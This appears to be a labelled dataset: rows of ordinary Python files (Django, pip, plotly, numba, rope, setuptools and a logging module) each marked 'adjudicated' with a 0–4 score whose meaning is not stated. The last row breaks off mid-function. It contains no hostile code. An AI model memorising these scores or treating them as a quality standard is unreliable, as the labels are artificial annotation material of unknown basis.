241	adjudicated	1	"""""""A simple log mechanism styled after PEP 282.""""""<<NEWL>><<NEWL>># The class here is styled after PEP 282 so that it could later be<<NEWL>># replaced with a standard Python logging implementation.<<NEWL>><<NEWL>>import sys<<NEWL>><<NEWL>>DEBUG = 1<<NEWL>>INFO = 2<<NEWL>>WARN = 3<<NEWL>>ERROR = 4<<NEWL>>FATAL = 5<<NEWL>><<NEWL>><<NEWL>>class Log:<<NEWL>>    def __init__(self, threshold=WARN):<<NEWL>>        self.threshold = threshold<<NEWL>><<NEWL>>    def _log(self, level, msg, args):<<NEWL>>        if level not in (DEBUG, INFO, WARN, ERROR, FATAL):<<NEWL>>            raise ValueError('%s wrong log level' % str(level))<<NEWL>><<NEWL>>        if level >= self.threshold:<<NEWL>>            if args:<<NEWL>>                msg = msg % args<<NEWL>>            if level in (WARN, ERROR, FATAL):<<NEWL>>                stream = sys.stderr<<NEWL>>            else:<<NEWL>>                stream = sys.stdout<<NEWL>>            try:<<NEWL>>                stream.write('%s\n' % msg)<<NEWL>>            except UnicodeEncodeError:<<NEWL>>                # emulate backslashreplace error handler<<NEWL>>                encoding = stream.encoding<<NEWL>>                msg = msg.encode(encoding, ""backslashreplace"").decode(encoding)<<NEWL>>                stream.write('%s\n' % msg)<<NEWL>>            stream.flush()<<NEWL>><<NEWL>>    def log(self, level, msg, *args):<<NEWL>>        self._log(level, msg, args)<<NEWL>><<NEWL>>    def debug(self, msg, *args):<<NEWL>>        self._log(DEBUG, msg, args)<<NEWL>><<NEWL>>    def info(self, msg, *args):<<NEWL>>        self._log(INFO, msg, args)<<NEWL>><<NEWL>>    def warn(self, msg, *args):<<NEWL>>        self._log(WARN, msg, args)<<NEWL>><<NEWL>>    def error(self, msg, *args):<<NEWL>>        self._log(ERROR, msg, args)<<NEWL>><<NEWL>>    def fatal(self, msg, *args):<<NEWL>>        self._log(FATAL, msg, args)<<NEWL>><<NEWL>><<NEWL>>_global_log = Log()<<NEWL>>log = _global_log.log<<NEWL>>debug = _global_log.debug<<NEWL>>info = _global_log.info<<NEWL>>warn = _global_log.warn<<NEWL>>error = _global_log.error<<NEWL>>fatal = _global_log.fatal<<NEWL>><<NEWL>><<NEWL>>def set_threshold(level):<<NEWL>>    # return the old threshold for use from tests<<NEWL>>    old = _global_log.threshold<<NEWL>>    _global_log.threshold = level<<NEWL>>    return old<<NEWL>><<NEWL>><<NEWL>>def set_verbosity(v):<<NEWL>>    if v <= 0:<<NEWL>>        set_threshold(WARN)<<NEWL>>    elif v == 1:<<NEWL>>        set_threshold(INFO)<<NEWL>>    elif v >= 2:<<NEWL>>        set_threshold(DEBUG)"
90	adjudicated	0	"# Copyright 2016 Google Inc. All rights reserved.<<NEWL>>#<<NEWL>># Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>># you may not use this file except in compliance with the License.<<NEWL>># You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#     http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing, software<<NEWL>># distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>># See the License for the specific language governing permissions and<<NEWL>># limitations under the License.<<NEWL>><<NEWL>>import pytest<<NEWL>>import webtest<<NEWL>><<NEWL>>import guestbook<<NEWL>><<NEWL>><<NEWL>>@pytest.fixture<<NEWL>>def app(testbed):<<NEWL>>    return webtest.TestApp(guestbook.app)<<NEWL>><<NEWL>><<NEWL>>def test_get_guestbook_sync(app, testbed, login):<<NEWL>>    guestbook.Account(id='123').put()<<NEWL>>    # Log the user in<<NEWL>>    login(id='123')<<NEWL>><<NEWL>>    for i in range(11):<<NEWL>>        guestbook.Guestbook(content='Content {}'.format(i)).put()<<NEWL>><<NEWL>>    response = app.get('/guestbook')<<NEWL>><<NEWL>>    assert response.status_int == 200<<NEWL>>    assert 'Content 1' in response.body<<NEWL>><<NEWL>><<NEWL>>def test_get_guestbook_async(app, testbed, login):<<NEWL>>    guestbook.Account(id='123').put()<<NEWL>>    # Log the user in<<NEWL>>    login(id='123')<<NEWL>>    for i in range(11):<<NEWL>>        guestbook.Guestbook(content='Content {}'.format(i)).put()<<NEWL>><<NEWL>>    response = app.get('/guestbook?async=1')<<NEWL>><<NEWL>>    assert response.status_int == 200<<NEWL>>    assert 'Content 1' in response.body<<NEWL>><<NEWL>><<NEWL>>def test_get_messages_sync(app, testbed):<<NEWL>>    for i in range(21):<<NEWL>>        account_key = guestbook.Account(nickname='Nick {}'.format(i)).put()<<NEWL>>        guestbook.Message(author=account_key, text='Text {}'.format(i)).put()<<NEWL>><<NEWL>>    response = app.get('/messages')<<NEWL>><<NEWL>>    assert response.status_int == 200<<NEWL>>    assert 'Nick 1 wrote:' in response.body<<NEWL>>    assert '<p>Text 1' in response.body<<NEWL>><<NEWL>><<NEWL>>def test_get_messages_async(app, testbed):<<NEWL>>    for i in range(21):<<NEWL>>        account_key = guestbook.Account(nickname='Nick {}'.format(i)).put()<<NEWL>>        guestbook.Message(author=account_key, text='Text {}'.format(i)).put()<<NEWL>><<NEWL>>    response = app.get('/messages?async=1')<<NEWL>><<NEWL>>    assert response.status_int == 200<<NEWL>>    assert 'Nick 1 wrote:' in response.body<<NEWL>>    assert '\nText 1' in response.body"
301	adjudicated	4	# This file is distributed under the same license as the Django package.<<NEWL>>#<<NEWL>># The *_FORMAT strings use the Django date format syntax,<<NEWL>># see https://docs.djangoproject.com/en/dev/ref/templates/builtins/#date<<NEWL>>DATE_FORMAT = r'Y. \g\a\d\a j. F'<<NEWL>>TIME_FORMAT = 'H:i'<<NEWL>>DATETIME_FORMAT = r'Y. \g\a\d\a j. F, H:i'<<NEWL>>YEAR_MONTH_FORMAT = r'Y. \g. F'<<NEWL>>MONTH_DAY_FORMAT = 'j. F'<<NEWL>>SHORT_DATE_FORMAT = r'j.m.Y'<<NEWL>>SHORT_DATETIME_FORMAT = 'j.m.Y H:i'<<NEWL>>FIRST_DAY_OF_WEEK = 1  # Monday<<NEWL>><<NEWL>># The *_INPUT_FORMATS strings use the Python strftime format syntax,<<NEWL>># see https://docs.python.org/library/datetime.html#strftime-strptime-behavior<<NEWL>># Kept ISO formats as they are in first position<<NEWL>>DATE_INPUT_FORMATS = [<<NEWL>>    '%Y-%m-%d', '%d.%m.%Y', '%d.%m.%y',  # '2006-10-25', '25.10.2006', '25.10.06'<<NEWL>>]<<NEWL>>TIME_INPUT_FORMATS = [<<NEWL>>    '%H:%M:%S',     # '14:30:59'<<NEWL>>    '%H:%M:%S.%f',  # '14:30:59.000200'<<NEWL>>    '%H:%M',        # '14:30'<<NEWL>>    '%H.%M.%S',     # '14.30.59'<<NEWL>>    '%H.%M.%S.%f',  # '14.30.59.000200'<<NEWL>>    '%H.%M',        # '14.30'<<NEWL>>]<<NEWL>>DATETIME_INPUT_FORMATS = [<<NEWL>>    '%Y-%m-%d %H:%M:%S',     # '2006-10-25 14:30:59'<<NEWL>>    '%Y-%m-%d %H:%M:%S.%f',  # '2006-10-25 14:30:59.000200'<<NEWL>>    '%Y-%m-%d %H:%M',        # '2006-10-25 14:30'<<NEWL>>    '%d.%m.%Y %H:%M:%S',     # '25.10.2006 14:30:59'<<NEWL>>    '%d.%m.%Y %H:%M:%S.%f',  # '25.10.2006 14:30:59.000200'<<NEWL>>    '%d.%m.%Y %H:%M',        # '25.10.2006 14:30'<<NEWL>>    '%d.%m.%y %H:%M:%S',     # '25.10.06 14:30:59'<<NEWL>>    '%d.%m.%y %H:%M:%S.%f',  # '25.10.06 14:30:59.000200'<<NEWL>>    '%d.%m.%y %H:%M',        # '25.10.06 14:30'<<NEWL>>    '%d.%m.%y %H.%M.%S',     # '25.10.06 14.30.59'<<NEWL>>    '%d.%m.%y %H.%M.%S.%f',  # '25.10.06 14.30.59.000200'<<NEWL>>    '%d.%m.%y %H.%M',        # '25.10.06 14.30'<<NEWL>>]<<NEWL>>DECIMAL_SEPARATOR = ','<<NEWL>>THOUSAND_SEPARATOR = 'Â '  # Non-breaking space<<NEWL>>NUMBER_GROUPING = 3
181	adjudicated	3	"from typing import Optional<<NEWL>><<NEWL>>from pip._internal.models.format_control import FormatControl<<NEWL>><<NEWL>><<NEWL>>class SelectionPreferences:<<NEWL>>    """"""<<NEWL>>    Encapsulates the candidate selection preferences for downloading<<NEWL>>    and installing files.<<NEWL>>    """"""<<NEWL>><<NEWL>>    __slots__ = [<<NEWL>>        ""allow_yanked"",<<NEWL>>        ""allow_all_prereleases"",<<NEWL>>        ""format_control"",<<NEWL>>        ""prefer_binary"",<<NEWL>>        ""ignore_requires_python"",<<NEWL>>    ]<<NEWL>><<NEWL>>    # Don't include an allow_yanked default value to make sure each call<<NEWL>>    # site considers whether yanked releases are allowed. This also causes<<NEWL>>    # that decision to be made explicit in the calling code, which helps<<NEWL>>    # people when reading the code.<<NEWL>>    def __init__(<<NEWL>>        self,<<NEWL>>        allow_yanked: bool,<<NEWL>>        allow_all_prereleases: bool = False,<<NEWL>>        format_control: Optional[FormatControl] = None,<<NEWL>>        prefer_binary: bool = False,<<NEWL>>        ignore_requires_python: Optional[bool] = None,<<NEWL>>    ) -> None:<<NEWL>>        """"""Create a SelectionPreferences object.<<NEWL>><<NEWL>>        :param allow_yanked: Whether files marked as yanked (in the sense<<NEWL>>            of PEP 592) are permitted to be candidates for install.<<NEWL>>        :param format_control: A FormatControl object or None. Used to control<<NEWL>>            the selection of source packages / binary packages when consulting<<NEWL>>            the index and links.<<NEWL>>        :param prefer_binary: Whether to prefer an old, but valid, binary<<NEWL>>            dist over a new source dist.<<NEWL>>        :param ignore_requires_python: Whether to ignore incompatible<<NEWL>>            ""Requires-Python"" values in links. Defaults to False.<<NEWL>>        """"""<<NEWL>>        if ignore_requires_python is None:<<NEWL>>            ignore_requires_python = False<<NEWL>><<NEWL>>        self.allow_yanked = allow_yanked<<NEWL>>        self.allow_all_prereleases = allow_all_prereleases<<NEWL>>        self.format_control = format_control<<NEWL>>        self.prefer_binary = prefer_binary<<NEWL>>        self.ignore_requires_python = ignore_requires_python"
210	adjudicated	1	"""""""A simple log mechanism styled after PEP 282.""""""<<NEWL>><<NEWL>># The class here is styled after PEP 282 so that it could later be<<NEWL>># replaced with a standard Python logging implementation.<<NEWL>><<NEWL>>DEBUG = 1<<NEWL>>INFO = 2<<NEWL>>WARN = 3<<NEWL>>ERROR = 4<<NEWL>>FATAL = 5<<NEWL>><<NEWL>>import sys<<NEWL>><<NEWL>>class Log:<<NEWL>><<NEWL>>    def __init__(self, threshold=WARN):<<NEWL>>        self.threshold = threshold<<NEWL>><<NEWL>>    def _log(self, level, msg, args):<<NEWL>>        if level not in (DEBUG, INFO, WARN, ERROR, FATAL):<<NEWL>>            raise ValueError('%s wrong log level' % str(level))<<NEWL>><<NEWL>>        if level >= self.threshold:<<NEWL>>            if args:<<NEWL>>                msg = msg % args<<NEWL>>            if level in (WARN, ERROR, FATAL):<<NEWL>>                stream = sys.stderr<<NEWL>>            else:<<NEWL>>                stream = sys.stdout<<NEWL>>            try:<<NEWL>>                stream.write('%s\n' % msg)<<NEWL>>            except UnicodeEncodeError:<<NEWL>>                # emulate backslashreplace error handler<<NEWL>>                encoding = stream.encoding<<NEWL>>                msg = msg.encode(encoding, ""backslashreplace"").decode(encoding)<<NEWL>>                stream.write('%s\n' % msg)<<NEWL>>            stream.flush()<<NEWL>><<NEWL>>    def log(self, level, msg, *args):<<NEWL>>        self._log(level, msg, args)<<NEWL>><<NEWL>>    def debug(self, msg, *args):<<NEWL>>        self._log(DEBUG, msg, args)<<NEWL>><<NEWL>>    def info(self, msg, *args):<<NEWL>>        self._log(INFO, msg, args)<<NEWL>><<NEWL>>    def warn(self, msg, *args):<<NEWL>>        self._log(WARN, msg, args)<<NEWL>><<NEWL>>    def error(self, msg, *args):<<NEWL>>        self._log(ERROR, msg, args)<<NEWL>><<NEWL>>    def fatal(self, msg, *args):<<NEWL>>        self._log(FATAL, msg, args)<<NEWL>><<NEWL>>_global_log = Log()<<NEWL>>log = _global_log.log<<NEWL>>debug = _global_log.debug<<NEWL>>info = _global_log.info<<NEWL>>warn = _global_log.warn<<NEWL>>error = _global_log.error<<NEWL>>fatal = _global_log.fatal<<NEWL>><<NEWL>>def set_threshold(level):<<NEWL>>    # return the old threshold for use from tests<<NEWL>>    old = _global_log.threshold<<NEWL>>    _global_log.threshold = level<<NEWL>>    return old<<NEWL>><<NEWL>>def set_verbosity(v):<<NEWL>>    if v <= 0:<<NEWL>>        set_threshold(WARN)<<NEWL>>    elif v == 1:<<NEWL>>        set_threshold(INFO)<<NEWL>>    elif v >= 2:<<NEWL>>        set_threshold(DEBUG)"
350	adjudicated	1	import os<<NEWL>>import signal<<NEWL>>import subprocess<<NEWL>><<NEWL>>from django.db.backends.base.client import BaseDatabaseClient<<NEWL>><<NEWL>><<NEWL>>class DatabaseClient(BaseDatabaseClient):<<NEWL>>    executable_name = 'psql'<<NEWL>><<NEWL>>    @classmethod<<NEWL>>    def runshell_db(cls, conn_params, parameters):<<NEWL>>        args = [cls.executable_name]<<NEWL>><<NEWL>>        host = conn_params.get('host', '')<<NEWL>>        port = conn_params.get('port', '')<<NEWL>>        dbname = conn_params.get('database', '')<<NEWL>>        user = conn_params.get('user', '')<<NEWL>>        passwd = conn_params.get('password', '')<<NEWL>>        sslmode = conn_params.get('sslmode', '')<<NEWL>>        sslrootcert = conn_params.get('sslrootcert', '')<<NEWL>>        sslcert = conn_params.get('sslcert', '')<<NEWL>>        sslkey = conn_params.get('sslkey', '')<<NEWL>><<NEWL>>        if user:<<NEWL>>            args += ['-U', user]<<NEWL>>        if host:<<NEWL>>            args += ['-h', host]<<NEWL>>        if port:<<NEWL>>            args += ['-p', str(port)]<<NEWL>>        args += [dbname]<<NEWL>>        args.extend(parameters)<<NEWL>><<NEWL>>        sigint_handler = signal.getsignal(signal.SIGINT)<<NEWL>>        subprocess_env = os.environ.copy()<<NEWL>>        if passwd:<<NEWL>>            subprocess_env['PGPASSWORD'] = str(passwd)<<NEWL>>        if sslmode:<<NEWL>>            subprocess_env['PGSSLMODE'] = str(sslmode)<<NEWL>>        if sslrootcert:<<NEWL>>            subprocess_env['PGSSLROOTCERT'] = str(sslrootcert)<<NEWL>>        if sslcert:<<NEWL>>            subprocess_env['PGSSLCERT'] = str(sslcert)<<NEWL>>        if sslkey:<<NEWL>>            subprocess_env['PGSSLKEY'] = str(sslkey)<<NEWL>>        try:<<NEWL>>            # Allow SIGINT to pass to psql to abort queries.<<NEWL>>            signal.signal(signal.SIGINT, signal.SIG_IGN)<<NEWL>>            subprocess.run(args, check=True, env=subprocess_env)<<NEWL>>        finally:<<NEWL>>            # Restore the original SIGINT handler.<<NEWL>>            signal.signal(signal.SIGINT, sigint_handler)<<NEWL>><<NEWL>>    def runshell(self, parameters):<<NEWL>>        self.runshell_db(self.connection.get_connection_params(), parameters)
172	adjudicated	2	"import _plotly_utils.basevalidators<<NEWL>><<NEWL>><<NEWL>>class LineValidator(_plotly_utils.basevalidators.CompoundValidator):<<NEWL>>    def __init__(self, plotly_name=""line"", parent_name=""scattersmith"", **kwargs):<<NEWL>>        super(LineValidator, self).__init__(<<NEWL>>            plotly_name=plotly_name,<<NEWL>>            parent_name=parent_name,<<NEWL>>            data_class_str=kwargs.pop(""data_class_str"", ""Line""),<<NEWL>>            data_docs=kwargs.pop(<<NEWL>>                ""data_docs"",<<NEWL>>                """"""<<NEWL>>            backoff<<NEWL>>                Sets the line back off from the end point of<<NEWL>>                the nth line segment (in px). This option is<<NEWL>>                useful e.g. to avoid overlap with arrowhead<<NEWL>>                markers. With ""auto"" the lines would trim<<NEWL>>                before markers if `marker.angleref` is set to<<NEWL>>                ""previous"".<<NEWL>>            backoffsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `backoff`.<<NEWL>>            color<<NEWL>>                Sets the line color.<<NEWL>>            dash<<NEWL>>                Sets the dash style of lines. Set to a dash<<NEWL>>                type string (""solid"", ""dot"", ""dash"",<<NEWL>>                ""longdash"", ""dashdot"", or ""longdashdot"") or a<<NEWL>>                dash length list in px (eg ""5px,10px,2px,2px"").<<NEWL>>            shape<<NEWL>>                Determines the line shape. With ""spline"" the<<NEWL>>                lines are drawn using spline interpolation. The<<NEWL>>                other available values correspond to step-wise<<NEWL>>                line shapes.<<NEWL>>            smoothing<<NEWL>>                Has an effect only if `shape` is set to<<NEWL>>                ""spline"" Sets the amount of smoothing. 0<<NEWL>>                corresponds to no smoothing (equivalent to a<<NEWL>>                ""linear"" shape).<<NEWL>>            width<<NEWL>>                Sets the line width (in px).<<NEWL>>"""""",<<NEWL>>            ),<<NEWL>>            **kwargs,<<NEWL>>        )"
32	adjudicated	2	"import _plotly_utils.basevalidators<<NEWL>><<NEWL>><<NEWL>>class OutsidetextfontValidator(_plotly_utils.basevalidators.CompoundValidator):<<NEWL>>    def __init__(self, plotly_name=""outsidetextfont"", parent_name=""funnel"", **kwargs):<<NEWL>>        super(OutsidetextfontValidator, self).__init__(<<NEWL>>            plotly_name=plotly_name,<<NEWL>>            parent_name=parent_name,<<NEWL>>            data_class_str=kwargs.pop(""data_class_str"", ""Outsidetextfont""),<<NEWL>>            data_docs=kwargs.pop(<<NEWL>>                ""data_docs"",<<NEWL>>                """"""<<NEWL>>            color<<NEWL>><<NEWL>>            colorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `color`.<<NEWL>>            family<<NEWL>>                HTML font family - the typeface that will be<<NEWL>>                applied by the web browser. The web browser<<NEWL>>                will only be able to apply a font if it is<<NEWL>>                available on the system which it operates.<<NEWL>>                Provide multiple font families, separated by<<NEWL>>                commas, to indicate the preference in which to<<NEWL>>                apply fonts if they aren't available on the<<NEWL>>                system. The Chart Studio Cloud (at<<NEWL>>                https://chart-studio.plotly.com or on-premise)<<NEWL>>                generates images on a server, where only a<<NEWL>>                select number of fonts are installed and<<NEWL>>                supported. These include ""Arial"", ""Balto"",<<NEWL>>                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",<<NEWL>>                ""Droid Sans Mono"", ""Gravitas One"", ""Old<<NEWL>>                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans<<NEWL>>                Narrow"", ""Raleway"", ""Times New Roman"".<<NEWL>>            familysrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `family`.<<NEWL>>            size<<NEWL>><<NEWL>>            sizesrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `size`.<<NEWL>>"""""",<<NEWL>>            ),<<NEWL>>            **kwargs,<<NEWL>>        )"
123	adjudicated	0	"import requests<<NEWL>>import re<<NEWL>>import json<<NEWL>>from urllib.parse import urlencode<<NEWL>><<NEWL>><<NEWL>>def convert_secid(secid: str) -> str:<<NEWL>>    if secid[0] == '6' or secid[0] == '5':<<NEWL>>        return f'1.{secid}'<<NEWL>>    return f'0.{secid}'<<NEWL>><<NEWL>><<NEWL>>def fetch_close_price(secid: str) -> float:<<NEWL>>    secid = convert_secid(secid)<<NEWL>><<NEWL>>    headers = {<<NEWL>>        ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0""<<NEWL>>    }<<NEWL>><<NEWL>>    base_url = ""http://push2.eastmoney.com/api/qt/stock/get""<<NEWL>><<NEWL>>    parameters = (<<NEWL>>        (""invt"", 2),<<NEWL>>        (""fltt"", 1),<<NEWL>>        (""cb"", ""jQuery3510768790004533975_1671331577142""),<<NEWL>>        (""fields"", ""f58,f734,f107,f57,f43,f59,f169,f170,f152,f177,f111,f46,f60,f44,f45,f47,f260,f48,f261,f279,f277,f278,f288,f19,f17,f531,f15,f13,f11,f20,f18,f16,f14,f12,f39,f37,f35,f33,f31,f40,f38,f36,f34,f32,f211,f212,f213,f214,f215,f210,f209,f208,f207,f206,f161,f49,f171,f50,f86,f84,f85,f168,f108,f116,f167,f164,f162,f163,f92,f71,f117,f292,f51,f52,f191,f192,f262""),<<NEWL>>        (""secid"", secid),<<NEWL>>        (""ut"", ""fa5fd1943c7b386f172d6893dbfba10b""),<<NEWL>>        (""wbp2u"", ""|0|0|0|web""),<<NEWL>>        (""_"", ""1671331577143""),<<NEWL>>    )<<NEWL>><<NEWL>>    url = base_url + '?' + urlencode(parameters)<<NEWL>><<NEWL>>    resp = requests.get(url, headers=headers)<<NEWL>>    if resp.status_code == requests.codes.ok:<<NEWL>>        try:<<NEWL>>            jq = resp.content.decode('utf-8')<<NEWL>>            p = re.compile(""jQuery[0-9_(]+(.*)\);"")<<NEWL>>            m = p.match(jq)<<NEWL>>            js = json.loads(m.group(1))<<NEWL>>            close_price_int = int(js[""data""][""f43""])<<NEWL>>            precision = int(js[""data""][""f59""])<<NEWL>>            close_price = close_price_int / pow(10, precision)<<NEWL>>            return close_price<<NEWL>>        except:<<NEWL>>            print(f""url = {url}"")<<NEWL>>            print(f""resp = {resp.content}"")<<NEWL>>    else:<<NEWL>>        print(f""url = {url}"")<<NEWL>>        print(f""status = {resp.status_code}"")<<NEWL>><<NEWL>>"
63	adjudicated	2	"import _plotly_utils.basevalidators<<NEWL>><<NEWL>><<NEWL>>class SymbolValidator(_plotly_utils.basevalidators.CompoundValidator):<<NEWL>>    def __init__(<<NEWL>>        self, plotly_name=""symbol"", parent_name=""layout.mapbox.layer"", **kwargs<<NEWL>>    ):<<NEWL>>        super(SymbolValidator, self).__init__(<<NEWL>>            plotly_name=plotly_name,<<NEWL>>            parent_name=parent_name,<<NEWL>>            data_class_str=kwargs.pop(""data_class_str"", ""Symbol""),<<NEWL>>            data_docs=kwargs.pop(<<NEWL>>                ""data_docs"",<<NEWL>>                """"""<<NEWL>>            icon<<NEWL>>                Sets the symbol icon image<<NEWL>>                (mapbox.layer.layout.icon-image). Full list:<<NEWL>>                https://www.mapbox.com/maki-icons/<<NEWL>>            iconsize<<NEWL>>                Sets the symbol icon size<<NEWL>>                (mapbox.layer.layout.icon-size). Has an effect<<NEWL>>                only when `type` is set to ""symbol"".<<NEWL>>            placement<<NEWL>>                Sets the symbol and/or text placement<<NEWL>>                (mapbox.layer.layout.symbol-placement). If<<NEWL>>                `placement` is ""point"", the label is placed<<NEWL>>                where the geometry is located If `placement` is<<NEWL>>                ""line"", the label is placed along the line of<<NEWL>>                the geometry If `placement` is ""line-center"",<<NEWL>>                the label is placed on the center of the<<NEWL>>                geometry<<NEWL>>            text<<NEWL>>                Sets the symbol text (mapbox.layer.layout.text-<<NEWL>>                field).<<NEWL>>            textfont<<NEWL>>                Sets the icon text font<<NEWL>>                (color=mapbox.layer.paint.text-color,<<NEWL>>                size=mapbox.layer.layout.text-size). Has an<<NEWL>>                effect only when `type` is set to ""symbol"".<<NEWL>>            textposition<<NEWL>>                Sets the positions of the `text` elements with<<NEWL>>                respects to the (x,y) coordinates.<<NEWL>>"""""",<<NEWL>>            ),<<NEWL>>            **kwargs,<<NEWL>>        )"
364	adjudicated	1	import numpy as np<<NEWL>>import numba as nb<<NEWL>><<NEWL>>from numpy.random import PCG64<<NEWL>>from timeit import timeit<<NEWL>><<NEWL>>bit_gen = PCG64()<<NEWL>>next_d = bit_gen.cffi.next_double<<NEWL>>state_addr = bit_gen.cffi.state_address<<NEWL>><<NEWL>>def normals(n, state):<<NEWL>>    out = np.empty(n)<<NEWL>>    for i in range((n + 1) // 2):<<NEWL>>        x1 = 2.0 * next_d(state) - 1.0<<NEWL>>        x2 = 2.0 * next_d(state) - 1.0<<NEWL>>        r2 = x1 * x1 + x2 * x2<<NEWL>>        while r2 >= 1.0 or r2 == 0.0:<<NEWL>>            x1 = 2.0 * next_d(state) - 1.0<<NEWL>>            x2 = 2.0 * next_d(state) - 1.0<<NEWL>>            r2 = x1 * x1 + x2 * x2<<NEWL>>        f = np.sqrt(-2.0 * np.log(r2) / r2)<<NEWL>>        out[2 * i] = f * x1<<NEWL>>        if 2 * i + 1 < n:<<NEWL>>            out[2 * i + 1] = f * x2<<NEWL>>    return out<<NEWL>><<NEWL>># Compile using Numba<<NEWL>>normalsj = nb.jit(normals, nopython=True)<<NEWL>># Must use state address not state with numba<<NEWL>>n = 10000<<NEWL>><<NEWL>>def numbacall():<<NEWL>>    return normalsj(n, state_addr)<<NEWL>><<NEWL>>rg = np.random.Generator(PCG64())<<NEWL>><<NEWL>>def numpycall():<<NEWL>>    return rg.normal(size=n)<<NEWL>><<NEWL>># Check that the functions work<<NEWL>>r1 = numbacall()<<NEWL>>r2 = numpycall()<<NEWL>>assert r1.shape == (n,)<<NEWL>>assert r1.shape == r2.shape<<NEWL>><<NEWL>>t1 = timeit(numbacall, number=1000)<<NEWL>>print(f'{t1:.2f} secs for {n} PCG64 (Numba/PCG64) gaussian randoms')<<NEWL>>t2 = timeit(numpycall, number=1000)<<NEWL>>print(f'{t2:.2f} secs for {n} PCG64 (NumPy/PCG64) gaussian randoms')<<NEWL>><<NEWL>># example 2<<NEWL>><<NEWL>>next_u32 = bit_gen.ctypes.next_uint32<<NEWL>>ctypes_state = bit_gen.ctypes.state<<NEWL>><<NEWL>>@nb.jit(nopython=True)<<NEWL>>def bounded_uint(lb, ub, state):<<NEWL>>    mask = delta = ub - lb<<NEWL>>    mask |= mask >> 1<<NEWL>>    mask |= mask >> 2<<NEWL>>    mask |= mask >> 4<<NEWL>>    mask |= mask >> 8<<NEWL>>    mask |= mask >> 16<<NEWL>><<NEWL>>    val = next_u32(state) & mask<<NEWL>>    while val > delta:<<NEWL>>        val = next_u32(state) & mask<<NEWL>><<NEWL>>    return lb + val<<NEWL>><<NEWL>><<NEWL>>print(bounded_uint(323, 2394691, ctypes_state.value))<<NEWL>><<NEWL>><<NEWL>>@nb.jit(nopython=True)<<NEWL>>def bounded_uints(lb, ub, n, state):<<NEWL>>    out = np.empty(n, dtype=np.uint32)<<NEWL>>    for i in range(n):<<NEWL>>        out[i] = bounded_uint(lb, ub, state)<<NEWL>><<NEWL>><<NEWL>>bounded_uints(323, 2394691, 10000000, ctypes_state.value)<<NEWL>><<NEWL>>
224	adjudicated	4	"""""""Fix the name of modules<<NEWL>><<NEWL>>This module is useful when you want to rename many of the modules in<<NEWL>>your project.  That can happen specially when you want to change their<<NEWL>>naming style.<<NEWL>><<NEWL>>For instance::<<NEWL>><<NEWL>>  fixer = FixModuleNames(project)<<NEWL>>  changes = fixer.get_changes(fixer=str.lower)<<NEWL>>  project.do(changes)<<NEWL>><<NEWL>>Here it renames all modules and packages to use lower-cased chars.<<NEWL>>You can tell it to use any other style by using the ``fixer``<<NEWL>>argument.<<NEWL>><<NEWL>>""""""<<NEWL>>from rope.base import taskhandle<<NEWL>>from rope.contrib import changestack<<NEWL>>from rope.refactor import rename<<NEWL>><<NEWL>><<NEWL>>class FixModuleNames:<<NEWL>>    def __init__(self, project):<<NEWL>>        self.project = project<<NEWL>><<NEWL>>    def get_changes(self, fixer=str.lower, task_handle=taskhandle.DEFAULT_TASK_HANDLE):<<NEWL>>        """"""Fix module names<<NEWL>><<NEWL>>        `fixer` is a function that takes and returns a `str`.  Given<<NEWL>>        the name of a module, it should return the fixed name.<<NEWL>><<NEWL>>        """"""<<NEWL>>        stack = changestack.ChangeStack(self.project, ""Fixing module names"")<<NEWL>>        jobset = task_handle.create_jobset(<<NEWL>>            ""Fixing module names"", self._count_fixes(fixer) + 1<<NEWL>>        )<<NEWL>>        try:<<NEWL>>            while True:<<NEWL>>                for resource in self._tobe_fixed(fixer):<<NEWL>>                    jobset.started_job(resource.path)<<NEWL>>                    renamer = rename.Rename(self.project, resource)<<NEWL>>                    changes = renamer.get_changes(fixer(self._name(resource)))<<NEWL>>                    stack.push(changes)<<NEWL>>                    jobset.finished_job()<<NEWL>>                    break<<NEWL>>                else:<<NEWL>>                    break<<NEWL>>        finally:<<NEWL>>            jobset.started_job(""Reverting to original state"")<<NEWL>>            stack.pop_all()<<NEWL>>            jobset.finished_job()<<NEWL>>        return stack.merged()<<NEWL>><<NEWL>>    def _count_fixes(self, fixer):<<NEWL>>        return len(list(self._tobe_fixed(fixer)))<<NEWL>><<NEWL>>    def _tobe_fixed(self, fixer):<<NEWL>>        for resource in self.project.get_python_files():<<NEWL>>            modname = self._name(resource)<<NEWL>>            if modname != fixer(modname):<<NEWL>>                yield resource<<NEWL>><<NEWL>>    def _name(self, resource):<<NEWL>>        modname = resource.name.rsplit(""."", 1)[0]<<NEWL>>        if modname == ""__init__"":<<NEWL>>            modname = resource.parent.name<<NEWL>>        return modname"
335	adjudicated	3	"import functools<<NEWL>>import operator<<NEWL>>import itertools<<NEWL>><<NEWL>>from .extern.jaraco.text import yield_lines<<NEWL>>from .extern.jaraco.functools import pass_none<<NEWL>>from ._importlib import metadata<<NEWL>>from ._itertools import ensure_unique<<NEWL>>from .extern.more_itertools import consume<<NEWL>><<NEWL>><<NEWL>>def ensure_valid(ep):<<NEWL>>    """"""<<NEWL>>    Exercise one of the dynamic properties to trigger<<NEWL>>    the pattern match.<<NEWL>>    """"""<<NEWL>>    ep.extras<<NEWL>><<NEWL>><<NEWL>>def load_group(value, group):<<NEWL>>    """"""<<NEWL>>    Given a value of an entry point or series of entry points,<<NEWL>>    return each as an EntryPoint.<<NEWL>>    """"""<<NEWL>>    # normalize to a single sequence of lines<<NEWL>>    lines = yield_lines(value)<<NEWL>>    text = f'[{group}]\n' + '\n'.join(lines)<<NEWL>>    return metadata.EntryPoints._from_text(text)<<NEWL>><<NEWL>><<NEWL>>def by_group_and_name(ep):<<NEWL>>    return ep.group, ep.name<<NEWL>><<NEWL>><<NEWL>>def validate(eps: metadata.EntryPoints):<<NEWL>>    